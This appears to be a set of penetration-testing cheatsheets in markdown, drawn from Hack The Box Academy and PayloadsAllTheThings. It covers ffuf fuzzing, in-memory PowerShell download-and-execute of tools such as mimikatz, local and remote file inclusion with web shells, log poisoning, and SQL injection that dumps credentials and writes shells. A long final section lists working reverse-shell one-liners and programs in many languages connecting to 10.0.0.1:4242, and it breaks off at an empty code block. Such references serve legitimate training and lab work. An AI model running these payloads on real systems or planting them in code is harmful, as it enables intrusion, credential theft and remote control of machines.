# FFuF
|   |   |
|---|---|
|`ffuf -h`|ffuf help|
|`ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ`|Directory Fuzzing|
|`ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/indexFUZZ`|Extension Fuzzing|
|`ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/blog/FUZZ.php`|Page Fuzzing|
|`ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ -recursion -recursion-depth 1 -e .php -v`|Recursive Fuzzing|
|`ffuf -w wordlist.txt:FUZZ -u https://FUZZ.hackthebox.eu/`|Sub-domain Fuzzing|
|`ffuf -w wordlist.txt:FUZZ -u http://academy.htb:PORT/ -H 'Host: FUZZ.academy.htb' -fs xxx`|VHost Fuzzing|
|`ffuf -w wordlist.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php?FUZZ=key -fs xxx`|Parameter Fuzzing - GET|
|`ffuf -w wordlist.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx`|Parameter Fuzzing - POST|
|`ffuf -w ids.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'id=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx`|Value Fuzzing|

# Wordlists

|**Command**|**Description**|
|---|---|
|`/opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt`|Directory/Page Wordlist|
|`/opt/useful/SecLists/Discovery/Web-Content/web-extensions.txt`|Extensions Wordlist|
|`/opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt`|Domain Wordlist|
|`/opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt`|Parameters Wordlist|

source: https://academy.hackthebox.com/module/54/section/483

#ffuf #web #hacking #wordlists #cheatsheet ## File Transfer
| **Command** | **Description** |
| --------------|-------------------|
| `Invoke-WebRequest https://<snip>/PowerView.ps1 -OutFile PowerView.ps1` | Download a file with PowerShell |
| `IEX (New-Object Net.WebClient).DownloadString('https://<snip>/Invoke-Mimikatz.ps1')`  | Execute a file in memory using PowerShell |
| `Invoke-WebRequest -Uri http://10.10.10.32:443 -Method POST -Body $b64` | Upload a file with PowerShell |
| `bitsadmin /transfer n http://10.10.10.32/nc.exe C:\Temp\nc.exe` | Download a file using Bitsadmin |
| `certutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe` | Download a file using Certutil |
| `wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh` | Download a file using Wget |
| `curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh` | Download a file using cURL |
| `php -r '$file = file_get_contents("https://<snip>/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'` | Download a file using PHP |
| `scp C:\Temp\bloodhound.zip user@10.10.10.150:/tmp/bloodhound.zip` | Upload a file using SCP |
| `scp user@target:/tmp/mimikatz.exe C:\Temp\mimikatz.exe` | Download a file using SCP |
| `Invoke-WebRequest http://nc.exe -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile "nc.exe"` | Invoke-WebRequest using a Chrome User Agent |#web #hacking #lfi #rce #logpoisoning #cheatsheet 
## Local File Inclusion

| **Command** | **Description** |
| --------------|-------------------|
| **Basic LFI** |
| `/index.php?language=/etc/passwd` | Basic LFI |
| `/index.php?language=../../../../etc/passwd` | LFI with path traversal |
| `/index.php?language=/../../../etc/passwd` | LFI with name prefix |
| `/index.php?language=./languages/../../../../etc/passwd` | LFI with approved path |
| **LFI Bypasses** |
| `/index.php?language=....//....//....//....//etc/passwd` | Bypass basic path traversal filter |
| `/index.php?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64` | Bypass filters with URL encoding |
| `/index.php?language=non_existing_directory/../../../etc/passwd/./././.[./ REPEATED ~2048 times]` | Bypass appended extension with path truncation (obsolete) |
| `/index.php?language=../../../../etc/passwd%00` | Bypass appended extension with null byte (obsolete) |
| `/index.php?language=php://filter/read=convert.base64-encode/resource=config` | Read PHP with base64 filter |


## Remote Code Execution

| **Command** | **Description** |
| --------------|-------------------|
| **PHP Wrappers** |
| `/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id` | RCE with data wrapper |
| `curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id"` | RCE with input wrapper |
| `curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"` | RCE with expect wrapper |
| **RFI** |
| `echo '<?php system($_GET["cmd"]); ?>' > shell.php && python3 -m http.server <LISTENING_PORT>` | Host web shell |
| `/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id` | Include remote PHP web shell |
| **LFI + Upload** |
| `echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif` | Create malicious image |
| `/index.php?language=./profile_images/shell.gif&cmd=id` | RCE with malicious uploaded image |
| `echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php` | Create malicious zip archive 'as jpg' |
| `/index.php?language=zip://shell.zip%23shell.php&cmd=id` | RCE with malicious uploaded zip |
| `php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg` | Create malicious phar 'as jpg' |
| `/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id` | RCE with malicious uploaded phar |
| **Log Poisoning** |
| `/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd` | Read PHP session parameters |
| `/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E` | Poison PHP session with web shell |
| `/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id` | RCE through poisoned PHP session |
| `curl -s "http://<SERVER_IP>:<PORT>/index.php" -A '<?php system($_GET["cmd"]); ?>'` | Poison server log |
| `/index.php?language=/var/log/apache2/access.log&cmd=id` | RCE through poisoned PHP session |


## Misc

| **Command** | **Description** |
| --------------|-------------------|
| `ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287` | Fuzz page parameters |
| `ffuf -w /opt/useful/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287` | Fuzz LFI payloads |
| `ffuf -w /opt/useful/SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287` | Fuzz webroot path |
| `ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287` | Fuzz server configurations |
| [LFI Wordlists](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)|
| [LFI-Jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt) |
| [Webroot path wordlist for Linux](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt)
| [Webroot path wordlist for Windows](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt) |
| [Server configurations wordlist for Linux](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux)
| [Server configurations wordlist for Windows](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows) |


## File Inclusion Functions

| **Function** | **Read Content** | **Execute** | **Remote URL** |
| ----- | :-----: | :-----: | :-----: |
| **PHP** |
| `include()`/`include_once()` | ✅ | ✅ | ✅ |
| `require()`/`require_once()` | ✅ | ✅ | ❌ |
| `file_get_contents()` | ✅ | ❌ | ✅ |
| `fopen()`/`file()` | ✅ | ❌ | ❌ |
| **NodeJS** |
| `fs.readFile()` | ✅ | ❌ | ❌ |
| `fs.sendFile()` | ✅ | ❌ | ❌ |
| `res.render()` | ✅ | ✅ | ❌ |
| **Java** |
| `include` | ✅ | ❌ | ❌ |
| `import` | ✅ | ✅ | ✅ |
| **.NET** | |
| `@Html.Partial()` | ✅ | ❌ | ❌ |
| `@Html.RemotePartial()` | ✅ | ❌ | ✅ |
| `Response.WriteFile()` | ✅ | ❌ | ❌ |
| `include` | ✅ | ✅ | ✅ |# SQL Injection
## MySQL

| **Command**   | **Description**   |
| --------------|-------------------|
| **General** |
| `mysql -u root -h docker.hackthebox.eu -P 3306 -p` | login to mysql database |
| `SHOW DATABASES` | List available databases |
| `USE users` | Switch to database |
| **Tables** |
| `CREATE TABLE logins (id INT, ...)` | Add a new table |
| `SHOW TABLES` | List available tables in current database |
| `DESCRIBE logins` | Show table properties and columns |
| `INSERT INTO table_name VALUES (value_1,..)` | Add values to table |
| `INSERT INTO table_name(column2, ...) VALUES (column2_value, ..)` | Add values to specific columns in a table |
| `UPDATE table_name SET column1=newvalue1, ... WHERE <condition>` | Update table values |
| **Columns** |
| `SELECT * FROM table_name` | Show all columns in a table |
| `SELECT column1, column2 FROM table_name` | Show specific columns in a table |
| `DROP TABLE logins` | Delete a table |
| `ALTER TABLE logins ADD newColumn INT` | Add new column |
| `ALTER TABLE logins RENAME COLUMN newColumn TO oldColumn` | Rename column |
| `ALTER TABLE logins MODIFY oldColumn DATE` | Change column datatype |
| `ALTER TABLE logins DROP oldColumn` | Delete column |
| **Output** |
| `SELECT * FROM logins ORDER BY column_1` | Sort by column |
| `SELECT * FROM logins ORDER BY column_1 DESC` | Sort by column in descending order |
| `SELECT * FROM logins ORDER BY column_1 DESC, id ASC` | Sort by two-columns |
| `SELECT * FROM logins LIMIT 2` | Only show first two results |
| `SELECT * FROM logins LIMIT 1, 2` | Only show first two results starting from index 2 |
| `SELECT * FROM table_name WHERE <condition>` | List results that meet a condition |
| `SELECT * FROM logins WHERE username LIKE 'admin%'` | List results where the name is similar to a given string |

## MySQL Operator Precedence
* Division (`/`), Multiplication (`*`), and Modulus (`%`)
* Addition (`+`) and Subtraction (`-`)
* Comparison (`=`, `>`, `<`, `<=`, `>=`, `!=`, `LIKE`)
* NOT (`!`)
* AND (`&&`)
* OR (`||`)

## SQL Injection
| **Payload**   | **Description**   |
| --------------|-------------------|
| **Auth Bypass** |
| `admin' or '1'='1` | Basic Auth Bypass |
| `admin')-- -` | Basic Auth Bypass With comments |
| [Auth Bypass Payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass) |
| **Union Injection** |
| `' order by 1-- -` | Detect number of columns using `order by` |
| `cn' UNION select 1,2,3-- -` | Detect number of columns using Union injection |
| `cn' UNION select 1,@@version,3,4-- -` | Basic Union injection |
| `UNION select username, 2, 3, 4 from passwords-- -` | Union injection for 4 columns |
| **DB Enumeration** |
| `SELECT @@version` | Fingerprint MySQL with query output |
| `SELECT SLEEP(5)` | Fingerprint MySQL with no output |
| `cn' UNION select 1,database(),2,3-- -` | Current database name |
| `cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -` | List all databases |
| `cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -` | List all tables in a specific database |
| `cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -` | List all columns in a specific table |
| `cn' UNION select 1, username, password, 4 from dev.credentials-- -` | Dump data from a table in another database |
| **Privileges** |
| `cn' UNION SELECT 1, user(), 3, 4-- -` | Find current user |
| `cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -` | Find if user has admin privileges |
| `cn' UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE user="root"-- -` | Find if all user privileges |
| `cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -` | Find which directories can be accessed through MySQL |
| **File Injection** |
| `cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -` | Read local file |
| `select 'file written successfully!' into outfile '/var/www/html/proof.txt'` | Write a string to a local file |
| `cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -` | Write a web shell into the base web directory |#shell #webshell #reverseshell #cheatsheet #hacking #php #python #powershell [source](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#start-of-content)

# Shells

More useful stuff:

1. [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master)
2. /[Methodology and Resources](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources)

# Reverse Shell Cheatsheet.md

## [](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#tools)Tools

- [reverse-shell-generator](https://www.revshells.com/) - Hosted Reverse Shell generator ([source](https://github.com/0dayCTF/reverse-shell-generator)) [![image](https://user-images.githubusercontent.com/44453666/115149832-d6a75980-a033-11eb-9c50-56d4ea8ca57c.png)](https://user-images.githubusercontent.com/44453666/115149832-d6a75980-a033-11eb-9c50-56d4ea8ca57c.png)
- [revshellgen](https://github.com/t0thkr1s/revshellgen) - CLI Reverse Shell generator

## [](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#reverse-shell)Reverse Shell

### [](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#bash-tcp)Bash TCP

```shell
bash -i >& /dev/tcp/10.0.0.1/4242 0>&1

0<&196;exec 196<>/dev/tcp/10.0.0.1/4242; sh <&196 >&196 2>&196

/bin/bash -l > /dev/tcp/10.0.0.1/4242 0<&1 2>&1
```

### [](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#bash-udp)Bash UDP

```shell
Victim:
sh -i >& /dev/udp/10.0.0.1/4242 0>&1

Listener:
nc -u -lvp 4242
```

Don't forget to check with others shell : sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh, bash

### [](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#socat)Socat

```powershell
user@attack$ socat file:`tty`,raw,echo=0 TCP-L:4242
user@victim$ /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4242
```

```powershell
user@victim$ wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4242
```

Static socat binary can be found at [https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat)

### [](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#perl)Perl

```perl
perl -e 'use Socket;$i="10.0.0.1";$p=4242;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"10.0.0.1:4242");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'


NOTE: Windows only
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"10.0.0.1:4242");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

### [](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python)Python

Linux only

IPv4

```python
export RHOST="10.0.0.1";export RPORT=4242;python -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
```

```python
python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
```

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

```python
python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
```

IPv4 (No Spaces)

```python
python -c 'socket=__import__("socket");os=__import__("os");pty=__import__("pty");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
```

```python
python -c 'socket=__import__("socket");subprocess=__import__("subprocess");os=__import__("os");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

```python
python -c 'socket=__import__("socket");subprocess=__import__("subprocess");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
```

IPv4 (No Spaces, Shortened)

```python
python -c 'a=__import__;s=a("socket");o=a("os").dup2;p=a("pty").spawn;c=s.socket(s.AF_INET,s.SOCK_STREAM);c.connect(("10.0.0.1",4242));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p("/bin/sh")'
```

```python
python -c 'a=__import__;b=a("socket");p=a("subprocess").call;o=a("os").dup2;s=b.socket(b.AF_INET,b.SOCK_STREAM);s.connect(("10.0.0.1",4242));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p(["/bin/sh","-i"])'
```

```python
python -c 'a=__import__;b=a("socket");c=a("subprocess").call;s=b.socket(b.AF_INET,b.SOCK_STREAM);s.connect(("10.0.0.1",4242));f=s.fileno;c(["/bin/sh","-i"],stdin=f(),stdout=f(),stderr=f())'
```

IPv4 (No Spaces, Shortened Further)

```python
python -c 'a=__import__;s=a("socket").socket;o=a("os").dup2;p=a("pty").spawn;c=s();c.connect(("10.0.0.1",4242));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p("/bin/sh")'
```

```python
python -c 'a=__import__;b=a("socket").socket;p=a("subprocess").call;o=a("os").dup2;s=b();s.connect(("10.0.0.1",4242));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p(["/bin/sh","-i"])'
```

```python
python -c 'a=__import__;b=a("socket").socket;c=a("subprocess").call;s=b();s.connect(("10.0.0.1",4242));f=s.fileno;c(["/bin/sh","-i"],stdin=f(),stdout=f(),stderr=f())'
```

IPv6

```python
python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::125c",4242,0,2));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
```

IPv6 (No Spaces)

```python
python -c 'socket=__import__("socket");os=__import__("os");pty=__import__("pty");s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::125c",4242,0,2));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
```

IPv6 (No Spaces, Shortened)

```python
python -c 'a=__import__;c=a("socket");o=a("os").dup2;p=a("pty").spawn;s=c.socket(c.AF_INET6,c.SOCK_STREAM);s.connect(("dead:beef:2::125c",4242,0,2));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p("/bin/sh")'
```

Windows only (Python2)

```powershell
python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('10.0.0.1', 4242)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"
```

Windows only (Python3)

```powershell
python.exe -c "import socket,os,threading,subprocess as sp;p=sp.Popen(['cmd.exe'],stdin=sp.PIPE,stdout=sp.PIPE,stderr=sp.STDOUT);s=socket.socket();s.connect(('10.0.0.1',4242));threading.Thread(target=exec,args=(\"while(True):o=os.read(p.stdout.fileno(),1024);s.send(o)\",globals()),daemon=True).start();threading.Thread(target=exec,args=(\"while(True):i=s.recv(1024);os.write(p.stdin.fileno(),i)\",globals())).start()"
```

### [](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#php)PHP

```shell
php -r '$sock=fsockopen("10.0.0.1",4242);exec("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("10.0.0.1",4242);shell_exec("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("10.0.0.1",4242);`/bin/sh -i <&3 >&3 2>&3`;'
php -r '$sock=fsockopen("10.0.0.1",4242);system("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("10.0.0.1",4242);passthru("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("10.0.0.1",4242);popen("/bin/sh -i <&3 >&3 2>&3", "r");'
```

```shell
php -r '$sock=fsockopen("10.0.0.1",4242);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
```

### [](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#ruby)Ruby

```ruby
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",4242).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

ruby -rsocket -e'exit if fork;c=TCPSocket.new("10.0.0.1","4242");loop{c.gets.chomp!;(exit! if $_=="exit");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts "failed: #{$_}"}'

NOTE: Windows only
ruby -rsocket -e 'c=TCPSocket.new("10.0.0.1","4242");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

### [](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#rust)Rust

```rust
use std::net::TcpStream;
use std::os::unix::io::{AsRawFd, FromRawFd};
use std::process::{Command, Stdio};

fn main() {
    let s = TcpStream::connect("10.0.0.1:4242").unwrap();
    let fd = s.as_raw_fd();
    Command::new("/bin/sh")
        .arg("-i")
        .stdin(unsafe { Stdio::from_raw_fd(fd) })
        .stdout(unsafe { Stdio::from_raw_fd(fd) })
        .stderr(unsafe { Stdio::from_raw_fd(fd) })
        .spawn()
        .unwrap()
        .wait()
        .unwrap();
}
```

### [](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#golang)Golang

```shell
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","10.0.0.1:4242");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
```

### [](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#netcat-traditional)Netcat Traditional

```shell
nc -e /bin/sh 10.0.0.1 4242
nc -e /bin/bash 10.0.0.1 4242
nc -c bash 10.0.0.1 4242
```

### [](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#netcat-openbsd)Netcat OpenBsd

```shell
rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f
```

### [](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#netcat-busybox)Netcat BusyBox

```shell
rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f
```

### [](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#ncat)Ncat

```shell
ncat 10.0.0.1 4242 -e /bin/bash
ncat --udp 10.0.0.1 4242 -e /bin/bash
```

### [](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#openssl)OpenSSL

Attacker:

```powershell
user@attack$ openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
user@attack$ openssl s_server -quiet -key key.pem -cert cert.pem -port 4242
or
user@attack$ ncat --ssl -vv -l -p 4242

user@victim$ mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 10.0.0.1:4242 > /tmp/s; rm /tmp/s
```

TLS-PSK (does not rely on PKI or self-signed certificates)

```shell
# generate 384-bit PSK
# use the generated string as a value for the two PSK variables from below
openssl rand -hex 48 
# server (attacker)
export LHOST="*"; export LPORT="4242"; export PSK="replacewithgeneratedpskfromabove"; openssl s_server -quiet -tls1_2 -cipher PSK-CHACHA20-POLY1305:PSK-AES256-GCM-SHA384:PSK-AES256-CBC-SHA384:PSK-AES128-GCM-SHA256:PSK-AES128-CBC-SHA256 -psk $PSK -nocert -accept $LHOST:$LPORT
# client (victim)
export RHOST="10.0.0.1"; export RPORT="4242"; export PSK="replacewithgeneratedpskfromabove"; export PIPE="/tmp/`openssl rand -hex 4`"; mkfifo $PIPE; /bin/sh -i < $PIPE 2>&1 | openssl s_client -quiet -tls1_2 -psk $PSK -connect $RHOST:$RPORT > $PIPE; rm $PIPE
```

### [](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#powershell)Powershell

```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.0.0.1",4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

```powershell
